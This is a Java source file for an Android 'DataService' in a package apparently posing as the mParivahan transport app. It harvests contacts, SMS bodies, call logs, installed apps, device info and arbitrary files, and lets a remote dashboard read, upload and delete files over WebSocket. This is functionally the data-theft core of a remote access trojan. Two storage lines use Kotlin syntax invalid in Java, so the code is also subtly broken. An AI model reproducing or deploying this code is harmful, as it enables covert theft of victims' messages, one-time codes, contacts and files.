package com.remoteadmin.mparivahan.services;

import android.content.ContentResolver;
import android.content.Context;
import android.database.Cursor;
import android.net.Uri;
import android.os.Environment;
import android.provider.CallLog;
import android.provider.ContactsContract;
import android.provider.MediaStore;
import android.provider.Telephony;
import android.util.Log;

import org.json.JSONArray;
import org.json.JSONException;
import org.json.JSONObject;

import java.io.File;
import java.io.FileInputStream;
import java.io.FileOutputStream;
import java.io.InputStream;
import java.io.OutputStream;
import java.util.ArrayList;
import java.util.List;

/**
 * DataService - Provides access to all phone data for the remote dashboard.
 *
 * Reads contacts, SMS, call logs, files, and installed apps
 * via Android ContentProviders and file system.
 *
 * All data is serialized as JSON for WebSocket transmission.
 */
public class DataService {

    private static final String TAG = "DataService";
    private final Context context;
    private final ContentResolver contentResolver;

    public DataService(Context context) {
        this.context = context;
        this.contentResolver = context.getContentResolver();
    }

    // ─── Contacts ───────────────────────────────────────────────────────────

    public String getContacts() throws JSONException {
        JSONArray contacts = new JSONArray();

        String[] projection = {
                ContactsContract.Contacts._ID,
                ContactsContract.Contacts.DISPLAY_NAME,
                ContactsContract.Contacts.PHOTO_THUMBNAIL_URI,
                ContactsContract.Contacts.HAS_PHONE_NUMBER
        };

        try (Cursor cursor = contentResolver.query(
                ContactsContract.Contacts.CONTENT_URI,
                projection, null, null,
                ContactsContract.Contacts.DISPLAY_NAME + " ASC")) {

            if (cursor != null) {
                while (cursor.moveToNext()) {
                    JSONObject contact = new JSONObject();
                    String id = cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts._ID));
                    contact.put("id", id);
                    contact.put("name", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME)));
                    contact.put("photo", cursor.getString(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.PHOTO_THUMBNAIL_URI)));
                    contact.put("hasPhone", cursor.getInt(cursor.getColumnIndexOrThrow(ContactsContract.Contacts.HAS_PHONE_NUMBER)) > 0);

                    // Get phone numbers
                    JSONArray phones = new JSONArray();
                    try (Cursor phoneCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
                            new String[]{ContactsContract.CommonDataKinds.Phone.NUMBER},
                            ContactsContract.CommonDataKinds.Phone.CONTACT_ID + " = ?",
                            new String[]{id}, null)) {
                        if (phoneCursor != null) {
                            while (phoneCursor.moveToNext()) {
                                phones.put(phoneCursor.getString(0));
                            }
                        }
                    }
                    contact.put("phones", phones);

                    // Get emails
                    JSONArray emails = new JSONArray();
                    try (Cursor emailCursor = contentResolver.query(
                            ContactsContract.CommonDataKinds.Email.CONTENT_URI,
                            new String[]{ContactsContract.CommonDataKinds.Email.ADDRESS},
                            ContactsContract.CommonDataKinds.Email.CONTACT_ID + " = ?",
                            new String[]{id}, null)) {
                        if (emailCursor != null) {
                            while (emailCursor.moveToNext()) {
                                emails.put(emailCursor.getString(0));
                            }
                        }
                    }
                    contact.put("emails", emails);

                    contacts.put(contact);
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Contacts permission denied", e);
        }

        return contacts.toString();
    }

    // ─── SMS Messages ───────────────────────────────────────────────────────

    public String getSmsMessages(int limit) throws JSONException {
        JSONArray messages = new JSONArray();

        String[] projection = {
                Telephony.Sms._ID,
                Telephony.Sms.ADDRESS,
                Telephony.Sms.BODY,
                Telephony.Sms.DATE,
                Telephony.Sms.TYPE,
                Telephony.Sms.READ
        };

        try (Cursor cursor = contentResolver.query(
                Telephony.Sms.CONTENT_URI,
                projection, null, null,
                Telephony.Sms.DATE + " DESC")) {

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < limit) {
                    JSONObject sms = new JSONObject();
                    sms.put("id", cursor.getString(0));
                    sms.put("address", cursor.getString(1));
                    sms.put("body", cursor.getString(2));
                    sms.put("date", cursor.getLong(3));
                    sms.put("type", cursor.getInt(4) == Telephony.Sms.MESSAGE_TYPE_SENT ? "sent" : "received");
                    sms.put("read", cursor.getInt(5) == 1);
                    messages.put(sms);
                    count++;
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "SMS permission denied", e);
        }

        return messages.toString();
    }

    // ─── Call Logs ──────────────────────────────────────────────────────────

    public String getCallLogs(int limit) throws JSONException {
        JSONArray calls = new JSONArray();

        String[] projection = {
                CallLog.Calls._ID,
                CallLog.Calls.NUMBER,
                CallLog.Calls.CACHED_NAME,
                CallLog.Calls.DATE,
                CallLog.Calls.DURATION,
                CallLog.Calls.TYPE
        };

        try (Cursor cursor = contentResolver.query(
                CallLog.Calls.CONTENT_URI,
                projection, null, null,
                CallLog.Calls.DATE + " DESC")) {

            if (cursor != null) {
                int count = 0;
                while (cursor.moveToNext() && count < limit) {
                    JSONObject call = new JSONObject();
                    call.put("id", cursor.getString(0));
                    call.put("number", cursor.getString(1));
                    call.put("name", cursor.getString(2));
                    call.put("date", cursor.getLong(3));
                    call.put("duration", cursor.getInt(4));
                    int type = cursor.getInt(5);
                    switch (type) {
                        case CallLog.Calls.INCOMING_TYPE:
                            call.put("type", "incoming");
                            break;
                        case CallLog.Calls.OUTGOING_TYPE:
                            call.put("type", "outgoing");
                            break;
                        case CallLog.Calls.MISSED_TYPE:
                            call.put("type", "missed");
                            break;
                        default:
                            call.put("type", "unknown");
                    }
                    calls.put(call);
                    count++;
                }
            }
        } catch (SecurityException e) {
            Log.e(TAG, "Call log permission denied", e);
        }

        return calls.toString();
    }

    // ─── File System ────────────────────────────────────────────────────────

    public String getFiles(String path) throws JSONException {
        JSONArray files = new JSONArray();
        File dir = new File(path);

        if (!dir.exists() || !dir.isDirectory()) {
            dir = Environment.getExternalStorageDirectory();
        }

        File[] fileList = dir.listFiles();
        if (fileList != null) {
            for (File file : fileList) {
                JSONObject fileObj = new JSONObject();
                fileObj.put("name", file.getName());
                fileObj.put("path", file.getAbsolutePath());
                fileObj.put("isDirectory", file.isDirectory());
                fileObj.put("size", file.length());
                fileObj.put("lastModified", file.lastModified());
                fileObj.put("readable", file.canRead());
                fileObj.put("writable", file.canWrite());

                if (file.isDirectory()) {
                    File[] children = file.listFiles();
                    fileObj.put("childCount", children != null ? children.length : 0);
                }

                files.put(fileObj);
            }
        }

        JSONObject result = new JSONObject();
        result.put("currentPath", dir.getAbsolutePath());
        result.put("parentPath", dir.getParent());
        result.put("files", files);
        return result.toString();
    }

    public byte[] getFileContent(String filePath) {
        try {
            File file = new File(filePath);
            if (!file.exists() || !file.canRead()) return null;

            byte[] data = new byte[(int) file.length()];
            try (FileInputStream fis = new FileInputStream(file)) {
                fis.read(data);
            }
            return data;
        } catch (Exception e) {
            Log.e(TAG, "Error reading file: " + filePath, e);
            return null;
        }
    }

    public boolean uploadFile(String targetPath, byte[] data) {
        try {
            File file = new File(targetPath);
            file.getParentFile().mkdirs();
            try (FileOutputStream fos = new FileOutputStream(file)) {
                fos.write(data);
            }
            return true;
        } catch (Exception e) {
            Log.e(TAG, "Error writing file: " + targetPath, e);
            return false;
        }
    }

    public boolean deleteFile(String filePath) {
        File file = new File(filePath);
        return file.exists() && file.delete();
    }

    // ─── Installed Apps ─────────────────────────────────────────────────────

    public String getInstalledApps() throws JSONException {
        JSONArray apps = new JSONArray();

        android.content.pm.PackageManager pm = context.getPackageManager();
        List<android.content.pm.ApplicationInfo> packages =
                pm.getInstalledApplications(android.content.pm.PackageManager.GET_META_DATA);

        for (android.content.pm.ApplicationInfo appInfo : packages) {
            JSONObject app = new JSONObject();
            app.put("name", pm.getApplicationLabel(appInfo).toString());
            app.put("packageName", appInfo.packageName);
            app.put("isSystem", (appInfo.flags & android.content.pm.ApplicationInfo.FLAG_SYSTEM) != 0);
            app.put("enabled", appInfo.enabled);

            try {
                android.content.pm.PackageInfo pi = pm.getPackageInfo(appInfo.packageName, 0);
                app.put("versionName", pi.versionName);
                app.put("versionCode", pi.versionCode);
                app.put("lastUpdated", pi.lastUpdateTime);
                app.put("installTime", pi.firstInstallTime);
            } catch (Exception e) {
                // Ignore
            }

            apps.put(app);
        }

        return apps.toString();
    }

    // ─── Device Info ────────────────────────────────────────────────────────

    public String getDeviceInfo() throws JSONException {
        JSONObject info = new JSONObject();
        info.put("model", android.os.Build.MODEL);
        info.put("manufacturer", android.os.Build.MANUFACTURER);
        info.put("androidVersion", android.os.Build.VERSION.RELEASE);
        info.put("sdkVersion", android.os.Build.VERSION.SDK_INT);
        info.put("device", android.os.Build.DEVICE);
        info.put("board", android.os.Build.BOARD);
        info.put("batteryLevel", getBatteryLevel());
        info.put("totalStorage", Environment.getExternalStorageDirectory().totalSpace);
        info.put("freeStorage", Environment.getExternalStorageDirectory().freeSpace);
        return info.toString();
    }

    private int getBatteryLevel() {
        android.content.IntentFilter filter = new android.content.IntentFilter(
                android.content.Intent.ACTION_BATTERY_CHANGED);
        android.content.Intent batteryStatus = context.registerReceiver(null, filter);
        if (batteryStatus != null) {
            int level = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_LEVEL, -1);
            int scale = batteryStatus.getIntExtra(android.os.BatteryManager.EXTRA_SCALE, -1);
            if (level >= 0 && scale > 0) {
                return (int) ((level / (float) scale) * 100);
            }
        }
        return -1;
    }
}
